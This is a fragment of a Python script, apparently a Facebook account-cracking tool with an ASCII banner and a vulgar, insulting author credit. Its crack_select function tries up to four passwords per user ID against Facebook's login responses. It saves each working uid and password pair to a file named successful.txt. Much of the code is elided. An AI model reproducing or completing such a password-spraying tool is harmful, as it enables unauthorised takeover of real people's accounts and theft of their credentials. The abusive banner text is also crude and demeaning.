...
|__/  |__/ \______/  \______/ |________/|__/  \__/
 ...
 ------------------------------------------
   ...
   Name : TERA PAPA ALAMGIR FUCK BOY 
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print(" \033[1;35m[ALAMGIR-OK√] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error"]:
					...
					q = json.loads(data)
					if "loc" in q:
						print(" \033[1;35m[ALAMGIR-OK√] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print(" \033[1;35m[ALAMGIR-OK√] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print(" \033[1;35m[ALAMGIR-OK√] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
...
def choice_select():
	...
	print(47*"-")
	print("")
	print("\t\033[1;32mCreated by:TERA PAPA ALAMGIR\033[0;97m")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
